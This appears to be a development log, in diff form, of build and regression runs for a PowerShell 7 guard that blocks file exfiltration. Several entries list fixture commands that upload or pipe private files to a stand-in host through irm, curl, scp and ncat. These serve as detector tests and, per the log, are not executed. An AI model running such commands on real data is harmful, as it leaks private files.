+PASS: 30 regressions across all eight findings.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+reg8-alias-and-pipe hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+reg8-url-path hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+reg8-namespace-and-if hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+The single local journal contains all three events for PID 19884, scans 16–18; decision=block:PS7-HTTP-CANARY-001 and result=0x4000. No request sent; registration and permissions unchanged.
+PS> & .\build\Undo-GuardRegressions.ps1
+Rule fixes rollback preflight passed; no files altered.
+The 13-file patch was reversed and reapplied in temporary source fixtures; exit=0.
+
+2026-11-18 — proactive follow-up
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 39 regressions across all eight findings (9 newly added), plus 5 curl config assertions.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+followup-possible-branch hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+followup-external-using hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Two matching block events in the single local journal for PID 31772. No external requests and no registration changes.
+PS> & .\build\Undo-GuardFollowup.ps1
+Rule fixes rollback preflight passed; no files altered.
+Verified the 8-file patch reverse/forward on temporary source fixtures.
+
+2026-11-18 — independent pipeline stages and provenance
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 57 regressions across the Guard findings (18 new).
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+independent-pipeline-restart hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+shared-curl-multi-destination hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+known-false-branch hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+Matched log PID 40356: scans 20 and 29 block; scan 21 neutral. No outbound request; no registration changes.
+PS> & .\build\Undo-GuardPipelineFlow.ps1
+Rule fixes rollback preflight passed; no files altered.
+Final patch verified in both directions in a temporary fixture.
+
+2026-11-18 — stage transfer and full-block evidence
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: complete scan after first block, scoped output effects, and independent source/chain evidence.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+continue-after-block hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+independent-pipeline-restart hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Direct DLL test PID 47332: one block event with two outbound findings; separate stage-restart block event contained source evidence. Network requests were not executed. Registration unchanged.
+PS> & .\build\Undo-GuardStageAnalysis.ps1
+Rule fixes rollback preflight passed; no files altered.
+The 10-file patch was tested forward and reverse on temporary fixtures.
+
+2026-11-18 — typed values, URL segment provenance and nested evaluation
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 19 type, fragment, curl and nested command regressions.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+numeric-zero-else hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+curl-credential-flow hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+nested-subexpression-send hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Journal PID 44012, scans 21–23: result=0x4000, decision=block:PS7-HTTP-CANARY-001.
+Source-only direct scan. No requests sent and no installation or permissions changes.
+PS> & .\build\Undo-GuardTypedValues.ps1
+Rule fixes rollback preflight passed; no files altered.
+The 10-file patch was applied forward and reverse in temporary fixtures.
+
+2026-11-18 — output variable state, increments, authentication, ReadCount
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 19 output-variable, increment, authentication and ReadCount regressions.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+out-variable-branch hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+preincrement-branch hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+wget-http-credentials hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+curl-proxy-credentials hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+All four journal records matched PID 45636 and scans 21–24. The fixture pauses between batches to avoid overwhelming the existing asynchronous log queue; production queue settings unchanged. No external requests or provider registration changes.
+PS> & .\build\Undo-GuardStateEffects.ps1
+Rule fixes rollback preflight passed; no files altered.
+Reverse and forward patch verified on temporary fixtures; final reverse check also passed.
+
+2026-11-18 — abbreviated capture and comparison side effects
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 15 abbreviated capture, provenance and comparison-effect regressions.
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+abbreviated-out-variable-branch hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+comparison-preincrement-branch hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+captured-file-out-variable hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+All three journal records matched PID 41388 and scans 21, 22, and 40. The separate managed fixture config verifies file-policy provenance without using a matching literal. No outbound connections or provider registration changes.
+PS> & .\build\Undo-GuardBindingEffects.ps1
+Rule fixes rollback preflight passed; no files altered. Forward/reverse patch round trip verified.
+
+2026-11-18 — HTTP multipart FileInfo and ConvertTo-Json provenance
+Fixture: private.txt contains "private body without text markers"; file-policy is block and matches its path, not its contents.
+Inputs (analyzed, not executed):
+$form=@{file=Get-Item -LiteralPath private.txt}; irm -Uri https://regression.invalid/upload -Method Post -Form $form
+$secret=Get-Content private.txt -Raw; $json=@{data=$secret} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/upload -Method Post -ContentType application/json -Body $json
+
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-form-json-xcayfkx7\before\tests\Compare-ObjectFlows.ps1
+Form: decision=3 policy=missing:dynamic-value
+JSON: decision=3 policy=missing:http-default-parameters
+exit=0
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-form-json-xcayfkx7\after\tests\Compare-ObjectFlows.ps1
+Form: decision=1 policy=block:file-policy
+JSON: decision=1 policy=block:file-policy
+exit=0
+Comparison ran in temporary staged copies (the unchanged setup and Scan helper from Test-SensitiveRules.ps1, followed solely by the two fixture inputs above). Staged copies were removed after verification.
+
+PS> cmake --build build --config Release
+GuardAst generated; 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 18 multipart FileInfo and JSON provenance regressions.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=47064
+form-file-object hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+convertto-json-provenance hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+PASS: actual DLL, managed AST and journal; Windows registration was not needed and no request was sent.
+exit=0
+Journal Form: pid=47064 scan=41 result=16384 policy=block:PS7-HTTP-CANARY-001
+Journal JSON: pid=47064 scan=42 result=16384 policy=block:PS7-HTTP-CANARY-001
+
+PS> & .\build\Undo-GuardFormJson.ps1
+Rule fixes rollback preflight passed; no files altered.
+PASS: patch reopened; reverse and forward results verified for 11 files.
+
+2026-11-18 — configurable filesystem inspection budget and adapters
+Offline baseline fixture uses max_files_per_scan=80, max_file_bytes=196608, file_scan_budget_ms=1500.
+Inputs (analyzed, not executed):
+  irm -Uri https://regression.invalid/ -InFile cross-chunk.txt
+  scp.exe -r tree user@regression.invalid:/incoming
+  irm -Uri https://regression.invalid/ -InFile partial.txt
+cross-chunk.txt = ASCII spaces * 163837 + fixture-sensitive-xyz.
+tree = 70 ordinary files and one fixture-sensitive-xyz file.
+partial.txt = ASCII spaces * 196608 + fixture-sensitive-xyz.
+
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-file-budget-2eu5ar1w\before\tests\Compare-FileInspection.ps1
+large-file: decision=3 policy=missing:file-content
+recursive-files: decision=3 policy=missing:scp-source-budget
+byte-budget: decision=3 policy=missing:file-content
+exit=0
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-file-budget-2eu5ar1w\after\tests\Compare-FileInspection.ps1
+large-file: decision=1 policy=block:sensitive-text
+recursive-files: decision=1 policy=block:sensitive-text
+byte-budget: decision=3 policy=missing:file-byte-budget
+exit=0
+Both fixture copies used the setup and Scan helper from Test-SensitiveRules.ps1 and were removed after verification.
+
+PS> cmake --build build --config Release
+GuardAst generated: 0 warnings, 0 errors; PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 26 file-budget, chunked scan, directory and adapter regressions.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=35020
+Fixture=streamed-large-file; Scan=43; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=ncat-listener-stdin; Scan=44; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+PASS: actual DLL, managed AST and journal; Windows registration was not needed and no request was sent.
+streamed-large-file hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+ncat-listener-stdin hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+
+PS> & .\build\Undo-GuardFileInspection.ps1
+Rule fixes rollback preflight passed; no files altered.
+PASS: patch reopened; reverse and forward results verified for 17 files (normalized source digests match).
+
+2026-11-18 — nested JSON records, default multipart enumeration, Git arguments, curl arity, Tail, path arrays, and common parameters
+The before/after comparison used the same Test-SensitiveRules.ps1 fixture setup and Scan helper. private.txt is protected by path only. report-fixture/item.txt contains the synthetic text marker. tail.txt has a 220000-character first record and a final synthetic marker record.
+Source inputs were inspected, not executed:
+  $s=Get-Content private.txt; $j=@{token=$s} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $j
+  $f=@{files=Get-ChildItem report-fixture}; irm -Uri https://regression.invalid/ -Form $f
+  curl.exe --limit-rate 100k -T private.txt https://regression.invalid/
+  Get-Content tail.txt -Tail 1 | ncat.exe regression.invalid 9000
+  Get-Content -Path "missing-fixture.txt","private.txt" | ncat.exe regression.invalid 9000
+  $f=@{file=Get-Item private.txt -ErrorAction Stop}; irm -Uri https://regression.invalid/ -Form $f
+
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-dataflow-followup-_05p_lvu\before\tests\Compare-Dataflow.ps1
+JSON: decision=3 policy=missing:json-output-partial
+Form: decision=3 policy=missing:file-set-arguments
+curl: decision=3 policy=missing:unsupported-option
+Tail: decision=3 policy=missing:file-content
+Path-array: decision=3 policy=missing:file-path
+Common: decision=3 policy=missing:file-item-arguments
+exit=0
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-dataflow-followup-_05p_lvu\after\tests\Compare-Dataflow.ps1
+JSON: decision=1 policy=block:file-policy
+Form: decision=1 policy=block:sensitive-text
+curl: decision=1 policy=block:file-policy
+Tail: decision=1 policy=block:sensitive-text
+Path-array: decision=1 policy=block:file-policy
+Common: decision=1 policy=block:file-policy
+exit=0
+Temporary comparison copies were removed after verification.
+
+PS> cmake --build build --config Release
+GuardAst generated: 0 warnings, 0 errors; PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 19 nested JSON, Form, curl arity, tail and multiple-path regressions.
+PASS: short branch, set-upstream, argumentless Git proofs, and stale HEAD/config rejection.
+100% tests passed, 0 tests failed out of 5
+exit=0
+The Git fixture preflights a local bare remote, proving two pending commits, including an intermediate file later removed, and one matched rule. The Scan accepts git push, git push origin main and git push -u origin main with the corresponding receipt. No push or network connection was executed.
+
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=51404
+Fixture=nested-json-lines; Scan=45; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=form-childitem-default; Scan=46; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=large-file-tail; Scan=47; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+PASS: actual DLL, managed AST and journal; Windows registration was not needed and no request was sent.
+nested-json-lines hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+form-childitem-default hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+large-file-tail hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+
+PS> & .\build\Undo-GuardDataflowFollowup.ps1
+Rule fixes rollback preflight passed; no files altered.
+PASS: patch reopened; reverse and forward results verified for 15 files (normalized source digests match).
+
+2026-11-19 — TotalCount, multipart filters, partial JSON provenance, and Git push proof coverage
+Fixture: records.txt has the synthetic marker on its first line followed by a 220000-character line; selection/item.csv contains the marker. These source inputs were inspected but not executed:
+  Get-Content records.txt -TotalCount 1 | ncat.exe regression.invalid 9000
+  $f=@{files=Get-ChildItem selection -File -Filter "*.csv"}; irm -Uri https://regression.invalid/ -Form $f
+  $s=Get-Content records.txt -Raw; $j=@{content=$s}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $j
+
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-source-proof-iqepo__u\before\tests\Compare-FileSources.ps1
+TotalCount: decision=3 policy=missing:file-content
+FormFilter: decision=3 policy=missing:file-set-arguments
+RawJson: decision=3 policy=missing:json-output-partial
+exit=0
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-source-proof-iqepo__u\after\tests\Compare-FileSources.ps1
+TotalCount: decision=1 policy=block:sensitive-text
+FormFilter: decision=1 policy=block:sensitive-text
+RawJson: decision=1 policy=block:sensitive-text
+exit=0
+Temporary comparison copies used the Test-SensitiveRules.ps1 Scan helper and were removed.
+
+PS> cmake --build build --config Release
+GuardAst generated: 0 warnings, 0 errors; PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 15 TotalCount, multipart file filters and partial JSON provenance regressions.
+PASS: named-remote default, short destination, force and ambiguous tag Git regressions.
+100% tests passed, 0 tests failed out of 5
+exit=0
+Git verification used a local bare remote. The corresponding proofs identified two candidate commits and one rule match; the unqualified destination was rejected when a same-name tag existed. No push was performed.
+
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1 | Select-String 'PowerShell=|streamed-head-records|filtered-childitem-form|streamed-raw-json|PASS: actual DLL'
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=51824
+Fixture=streamed-head-records; Scan=48; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=filtered-childitem-form; Scan=49; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=streamed-raw-json; Scan=50; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+PASS: actual DLL, managed AST and journal; Windows registration was not needed and no request was sent.
+streamed-head-records hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+filtered-childitem-form hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+streamed-raw-json hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+The final fixture batch waits for the bounded asynchronous test journal queue to drain; production queue and registration were unchanged.
+
+PS> & .\build\Undo-GuardSourceProof.ps1
+Rule fixes rollback preflight passed; no files altered.
+PASS: patch reopened; reverse and forward results verified for 15 files (normalized source digests match).
+
+2026-11-19 — Exclude multipart candidates, JSON line records and large Git Blob streaming
+Local Windows PowerShell 7.6.9 spot check with a.csv and b.tmp:
+exclude (plain directory, -File -Exclude '*.tmp')=
+literal (same directory, -LiteralPath -File -Exclude '*.tmp')=a.csv
+exclude without -File=a.csv
+The analyzer no longer assumes an empty set for the Exclude-only form. This documented-candidate behavior is intentionally conservative where the host returns an empty set.
+
+Inputs for the before/after fixture (analyzed, not executed):
+  $f=@{files=Get-ChildItem reports -File -Exclude "*.tmp"}; irm -Uri https://regression.invalid/ -Form $f
+  $s=Get-Content large.txt; $j=@{lines=$s}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $j
+The Git fixture has one commit with large.txt whose marking text starts at byte 163837, across a 32 KiB matcher boundary. The work tree's same-named file is overwritten with an ordinary string after committing. The helper points to an empty local bare repository and does not push.
+
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-blob-stream-n4pzjhkv\before\tests\Compare-BlobSources.ps1
+Exclude: decision=2 policy=no-match
+LineJson: decision=3 policy=missing:json-output-partial
+GitBlob: preflight-ready; commits=1; objects=3; matched-rules=0; complete=False; network=False
+exit=0
+PS> & "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\build\guard-blob-stream-n4pzjhkv\after\tests\Compare-BlobSources.ps1
+Exclude: decision=1 policy=block:sensitive-text
+LineJson: decision=1 policy=block:sensitive-text
+GitBlob: preflight-ready; commits=1; objects=3; matched-rules=1; complete=True; network=False
+exit=0
+Temporary before/after copies used the Test-SensitiveRules.ps1 fixture Scan helper and were removed.
+
+PS> cmake --build build --config Release
+GuardAst generated: 0 warnings, 0 errors; PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 6 multipart Exclude and unmaterialized JSON line-record regressions.
+PASS: Git Blob streaming, committed object vs. working tree, and confirmed hits under the byte budget.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1 | Select-String 'PowerShell=|multipart-exclude-candidates|streamed-line-record-json|PASS: actual DLL'
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=58152
+Fixture=multipart-exclude-candidates; Scan=51; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+Fixture=streamed-line-record-json; Scan=52; Result=16384; Policy=block:PS7-HTTP-CANARY-001
+PASS: actual DLL, managed AST and journal; Windows registration was not needed and no request was sent.
+multipart-exclude-candidates hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+streamed-line-record-json hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+
+PS> & .\build\Undo-GuardBlobStream.ps1
+Rule fixes rollback preflight passed; no files altered.
+PASS: patch reopened; reverse and forward results verified for 12 files.
